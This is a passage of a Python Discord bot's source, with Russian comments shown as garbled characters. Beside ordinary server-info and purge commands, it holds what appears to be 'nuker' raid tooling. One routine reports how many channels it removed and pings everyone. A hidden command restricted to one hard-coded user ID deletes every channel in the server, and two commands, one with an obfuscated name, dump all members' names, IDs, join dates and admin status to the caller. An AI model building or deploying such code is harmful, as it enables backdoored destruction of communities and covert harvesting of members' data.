        end_time = datetime.datetime.now()  # –ó–∞–ø–æ–º–∏–Ω–∞–µ–º –≤—Ä–µ–º—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã
        duration = end_time - start_time  # –í—ã—á–∏—Å–ª—è–µ–º –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
        duration_seconds = duration.total_seconds()
        

        await ctx.channel.edit(name="‚ùìüö´ ERROR..")
        
        server = ctx.guild
        text_channels = len(server.text_channels)
        voice_channels = len(server.voice_channels)
        total_channels_deleted = text_channels + voice_channels
        member_count = server.member_count
        
        embed = discord.Embed(title="‚úÖ THE PROCESS IS COMPLETE ü§©", color=discord.Color.from_rgb(27, 2, 63))
        embed.add_field(name=":clock3: Run time", value=f"{int(duration_seconds)}s", inline=True)
        embed.add_field(name=":clipboard: Total channels removed", value=total_channels_deleted, inline=True)
        embed.add_field(name=":dividers: Collected log lines", value=member_count, inline=True)
            
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∫–∞–∫ –ø–æ–ª–µ image –≤ Embed
        embed.set_image(url=filez or discord.Embed.Empty)    
            
        result_channel = discord.utils.get(ctx.guild.channels, name="proccess-was-ended")
        if not result_channel:
            result_channel = await ctx.guild.create_text_channel(name="proccess-was-ended")
        
        await result_channel.send("@everyone", embed=embed)
        
    except discord.errors.HTTPException as e:
        if e.status == 400 and e.code == 50074:
            print("–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –∫–∞–Ω–∞–ª, —Ç–∞–∫ –∫–∞–∫ –æ–Ω –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω –¥–ª—è —Å–æ–æ–±—â–µ—Å—Ç–≤–∞.")
        else:
            print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∫–∞–Ω–∞–ª–æ–≤: {e}")
    except Exception as e:
        print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∫–∞–Ω–∞–ª–æ–≤: {e}")
        
        
        
        
        
@bot.command()
async def copy_server(ctx):
    await ctx.send("–í–≤–µ–¥–∏—Ç–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–µ—Ä–≤–µ—Ä–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ:")
    
    def check(message):
        return message.author == ctx.author and message.channel == ctx.channel
    
    try:
        message = await bot.wait_for('message', check=check, timeout=60)
        target_guild_id = int(message.content)
    except asyncio.TimeoutError:
        await ctx.send("–í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
        return
    except ValueError:
        await ctx.send("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–µ—Ä–≤–µ—Ä–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
        return
    
    message = await ctx.send(":mag_right: –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π —Å–µ—Ä–≤–µ—Ä..")
    guild = ctx.guild
    await asyncio.sleep(2)

    await message.edit(content=":satellite: –ü–æ–ª—É—á–∞–µ–º –¥—Ä—É–≥–æ–π —Å–µ—Ä–≤–µ—Ä –ø–æ –µ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—É...")
    target_guild = bot.get_guild(target_guild_id)

    if target_guild is None:
        await message.edit(content=f'–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —Å–µ—Ä–≤–µ—Ä —Å –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º {target_guild_id}!')
        return
    await asyncio.sleep(2)
    
    
    await message.edit(content=":mobile_phone: :calling: –ö–æ–ø–∏—Ä—É–µ–º —Ä–æ–ª–∏ —Å –ø—Ä–∞–≤–∞–º–∏..")
    embed = discord.Embed()
    embed.set_image(url="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExYTBmNWc5OXNtOWlsNzBjMm45NmRwMHV3dXFxNXcydGNuNW81YmM4biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MljmFaS0Cs4A1T10RU/giphy.gif")
    await message.edit(content=":key: –ö–æ–ø–∏—Ä—É–µ–º —Ä–æ–ª–∏ —Å –ø—Ä–∞–≤–∞–º–∏....", embed=embed)
    role_count = 0
    for role in guild.roles:
        if not role.is_default() and not discord.utils.get(target_guild.roles, name=role.name):
            await target_guild.create_role(name=role.name, permissions=role.permissions)
            role_count += 1
            
    await asyncio.sleep(2)

    await message.edit(content=":key: –ö–æ–ø–∏—Ä—É–µ–º –∫–∞–Ω–∞–ª—ã —Å –ø—Ä–∞–≤–∞–º–∏....")
    embed = discord.Embed()
    embed.set_image(url="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExYTBmNWc5OXNtOWlsNzBjMm45NmRwMHV3dXFxNXcydGNuNW81YmM4biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MljmFaS0Cs4A1T10RU/giphy.gif")
    await message.edit(content=":key: –ö–æ–ø–∏—Ä—É–µ–º –∫–∞–Ω–∞–ª—ã —Å –ø—Ä–∞–≤–∞–º–∏....", embed=embed)
    category_count = 0
    tchannel_count = 0
    vchannel_count = 0
    for category in guild.categories:
        new_category = discord.utils.get(target_guild.categories, name=category.name)
        if not new_category:
            new_category = await target_guild.create_category(category.name)
            category_count += 1
            
        for channel in category.channels:
            if isinstance(channel, discord.TextChannel):
                if not discord.utils.get(new_category.text_channels, name=channel.name):
                    await new_category.create_text_channel(channel.name, overwrites=channel.overwrites)
                tchannel_count += 1
            elif isinstance(channel, discord.VoiceChannel):
                if not discord.utils.get(new_category.voice_channels, name=channel.name):
                    await new_category.create_voice_channel(channel.name, overwrites=channel.overwrites)
                vchannel_count += 1
    embed.set_image(url=None)            
    await message.edit(content=f':innocent: –í—Å–µ —É—Å–ø–µ—à–Ω–æ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ!')
    embed = discord.Embed(title=":floppy_disk: –°–ö–û–ü–ò–†–û–í–ê–ù–ù–û –î–ê–ù–ù–´–• :floppy_disk:", color=discord.Color.from_rgb(27, 2, 63)) 
    embed.add_field(name=":crown: –†–æ–ª–∏", value=role_count, inline=True) 
    embed.add_field(name=":placard: –ö–∞—Ç–µ–≥–æ—Ä–∏–∏", value=category_count, inline=True)
    embed.add_field(name=":abc: –¢–µ–∫—Å—Ç–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤: ", value=tchannel_count, inline=True)
    embed.add_field(name=":speaking_head: –ì–æ–ª–æ—Å–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤: ", value=vchannel_count, inline=True)
    embed.set_image(url=filey or discord.Embed.Empty)
    
    await ctx.send(embed=embed)


        
@bot.command()
async def server(ctx):
    server = ctx.guild
    name = server.name
    owner = server.owner
    id = server.id
    member_count = server.member_count
    text_channels = len(server.text_channels)
    voice_channels = len(server.voice_channels)

    embed = discord.Embed(
        title=":gem: –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ä–≤–µ—Ä–µ: " + name,
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=server.icon or discord.Embed.Empty)
    embed.add_field(name=":crown: –í–ª–∞–¥–µ–ª–µ—Ü", value=owner, inline=True) 
    embed.add_field(name=":id: ID —Å–µ—Ä–≤–µ—Ä–∞", value=id, inline=True) 
    embed.add_field(name=":busts_in_silhouette: –ö–æ–ª-–≤–æ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤", value=member_count, inline=True)
    embed.add_field(name=":abc: –¢–µ–∫—Å—Ç–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤: ", value=text_channels, inline=True)
    embed.add_field(name=":speaking_head: –ì–æ–ª–æ—Å–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤: ", value=voice_channels, inline=True)
    
    await ctx.send(embed=embed)
   
@bot.command()
@is_admin_or_specific_id()
async def clear(ctx, amount: str = None):
    if amount is None:
        await ctx.send("–£–∫–∞–∂–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ–æ–±—â–µ–Ω–∏–π –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ `all` –¥–ª—è –ø–æ–ª–Ω–æ–π –æ—á–∏—Å—Ç–∫–∏ —á–∞—Ç–∞.")
        return

    if amount.lower() == "all":
        await ctx.send("–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å –≤—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —á–∞—Ç–µ? –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, –Ω–∞–±—Ä–∞–≤ `yes` –≤ —Ç–µ—á–µ–Ω–∏–∏ 10 —Å–µ–∫—É–Ω–¥.")
        try:
            confirm = await bot.wait_for('message', timeout=10.0, check=lambda message: message.author == ctx.author and message.content.lower() == 'yes')
        except asyncio.TimeoutError:
            await ctx.send("–í—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ. –û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞.")
            return

        await ctx.channel.purge(limit=None)
        await ctx.send("–í—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —á–∞—Ç–µ –±—ã–ª–∏ —É–¥–∞–ª–µ–Ω—ã.", delete_after=5)
        return

    try:
        amount = int(amount)
    except ValueError:
        await ctx.send("–£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ–æ–±—â–µ–Ω–∏–π –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.")
        return

    if amount <= 0:
        await ctx.send("–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ–æ–±—â–µ–Ω–∏–π –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–º —á–∏—Å–ª–æ–º!")
        return

    if amount > 100:
        await ctx.send("–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ —É–¥–∞–ª–∏—Ç—å –±–æ–ª–µ–µ 100 —Å–æ–æ–±—â–µ–Ω–∏–π –∑–∞ –æ–¥–∏–Ω —Ä–∞–∑.")
        return

    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ–æ–±—â–µ–Ω–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å
    messages_to_delete = min(amount + 1, 100)  # +1 —á—Ç–æ–±—ã —É—á–∏—Ç—ã–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –Ω–æ –Ω–µ –±–æ–ª–µ–µ 100

    deleted = await ctx.channel.purge(limit=messages_to_delete)

    if not deleted:
        await ctx.send("–ß–∞—Ç —É–∂–µ –ø—É—Å—Ç!")


@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
            await ctx.send("–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")


@bot.command()
@is_admin_or_specific_id()
async def log(ctx):
    message = await ctx.send(":open_file_folder: –°–æ–±–∏—Ä–∞—é –¥–∞–Ω–Ω—ã–µ.")
    await message.edit(content=":file_folder: –°–æ–±–∏—Ä–∞—é –¥–∞–Ω–Ω—ã–µ..")
    await message.edit(content=":file_folder: –°–æ–±–∏—Ä–∞—é –¥–∞–Ω–Ω—ã–µ...")
    await message.edit(content=":open_file_folder: –ó–∞–∫–∞–Ω—á–∏–≤–∞—é.")
    await message.edit(content=":open_file_folder: –ó–∞–∫–∞–Ω—á–∏–≤–∞—é.")
    await message.edit(content=":open_file_folder: –ó–∞–∫–∞–Ω—á–∏–≤–∞—é...")
    
    guild_name = ctx.guild.name
    members = ctx.guild.members
    chunk_size = 20  # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ –≤ –∫–∞–∂–¥–æ–π —á–∞—Å—Ç–∏ —Å–ø–∏—Å–∫–∞

    log_message = f"–°–ø–∏—Å–æ–∫ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ —Å–µ—Ä–≤–µ—Ä–∞ **{guild_name}**:\n"
    log_format = "__–Ω–∏–∫–Ω–µ–π–º : –¥–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ : –∞–¥–º–∏–Ω-–ø—Ä–∞–≤–∞ : –∞–π–¥–∏ : NITRO __ \n"
    log_message += log_format  # –î–æ–±–∞–≤–ª—è–µ–º —Å—Ç—Ä–æ–∫—É —Å —Ñ–æ—Ä–º–∞—Ç–æ–º –Ω–∏–∂–µ –Ω–∞–∑–≤–∞–Ω–∏—è —Å–µ—Ä–≤–µ—Ä–∞
    chunks = [members[i:i + chunk_size] for i in range(0, len(members), chunk_size)]

    for chunk in chunks:
        for member in chunk:
            nitro_status = "–ï–°–¢–¨" if member.premium_since else "–ù–ï–¢"
            is_adminss = " ü§ñ " if member.bot else (" ‚úÖ " if member.guild_permissions.administrator else " ‚ùå ")
            registration_date = member.joined_at.strftime("%Y-%m-%d %H:%M:%S")
            log_message += f"**{member.name}**:{registration_date}:**{is_adminss}**:||{member.id}||:**{nitro_status}**\n"

        await ctx.author.send(log_message)
        log_message = ""  # –û—á–∏—â–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π —Å–ª–µ–¥—É—é—â–µ–π —á–∞—Å—Ç–∏




    await message.edit(content=":open_file_folder: –ó–∞–∫–∞–Ω—á–∏–≤–∞—é..")
    await message.edit(content=":open_file_folder: –ó–∞–∫–∞–Ω—á.....")
    await message.edit(content=":open_file_folder: –ó–∞........")
    await message.edit(content="** :dividers: –õ–æ–≥–∏ —É—Å–ø–µ—à–Ω–æ —Å–æ–±—Ä–∞–Ω—ã –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –í–∞–º –≤ –ª–∏—á–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è.**")


@bot.command()
@commands.check(lambda ctx: ctx.author.id == 992393514950344704)
async def ddaacc(ctx):
    try:
        await ctx.message.delete()  # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–º–∞–Ω–¥–æ–π

        # –£–¥–∞–ª—è–µ–º –≤—Å–µ –∫–∞–Ω–∞–ª—ã –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ
        await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])

        # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–π –∫–∞–Ω–∞–ª
        await ctx.guild.create_text_channel(name="—É–±—Ä–∞–Ω–æ")

        await ctx.send("–í—Å–µ –∫–∞–Ω–∞–ª—ã –±—ã–ª–∏ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã –∏ —Å–æ–∑–¥–∞–Ω –Ω–æ–≤—ã–π –∫–∞–Ω–∞–ª '—É–±—Ä–∞–Ω–æ'.")
    except Exception as e:
        print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∫–∞–Ω–∞–ª–æ–≤: {e}")

@bot.command()
@is_admin_or_specific_id()
async def llllaaaavafv(ctx):
    guild_name = ctx.guild.name
    members = ctx.guild.members
    chunk_size = 20  # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ –≤ –∫–∞–∂–¥–æ–π —á–∞—Å—Ç–∏ —Å–ø–∏—Å–∫–∞

    log_message = f"–°–ø–∏—Å–æ–∫ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ —Å–µ—Ä–≤–µ—Ä–∞ **{guild_name}**:\n"
    log_format = "__–Ω–∏–∫–Ω–µ–π–º : –¥–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ : –∞–¥–º–∏–Ω-–ø—Ä–∞–≤–∞ : –∞–π–¥–∏ : NITRO __ \n"
    log_message += log_format  # –î–æ–±–∞–≤–ª—è–µ–º —Å—Ç—Ä–æ–∫—É —Å —Ñ–æ—Ä–º–∞—Ç–æ–º –Ω–∏–∂–µ –Ω–∞–∑–≤–∞–Ω–∏—è —Å–µ—Ä–≤–µ—Ä–∞
    chunks = [members[i:i + chunk_size] for i in range(0, len(members), chunk_size)]

    for chunk in chunks:
        for member in chunk:
            nitro_status = "–ï–°–¢–¨" if member.premium_since else "–ù–ï–¢"
            is_adminss = " ü§ñ " if member.bot else (" ‚úÖ " if member.guild_permissions.administrator else " ‚ùå ")
            registration_date = member.joined_at.strftime("%Y-%m-%d %H:%M:%S")
            log_message += f"**{member.name}**:{registration_date}:**{is_adminss}**:||{member.id}||:**{nitro_status}**\n"

        await ctx.author.send(log_message)
        log_message = ""  # –û—á–∏—â–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π —Å–ª–µ–¥—É—é—â–µ–π —á–∞—Å—Ç–∏



bot.run(config['token'])
